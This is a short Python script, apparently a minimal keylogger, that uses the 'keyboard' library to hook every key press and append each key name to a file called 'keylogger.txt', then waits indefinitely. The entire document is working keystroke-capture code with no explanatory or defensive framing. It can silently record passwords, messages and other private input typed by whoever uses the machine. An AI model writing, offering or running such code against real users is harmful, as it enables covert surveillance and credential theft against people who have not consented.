import keyboard

log_file = 'keylogger.txt'

def OnKeyboardEvent(event):
    with open(log_file, 'a') as f:
        f.write(event.name + '\n')

keyboard.on_press(OnKeyboardEvent)
keyboard.wait()
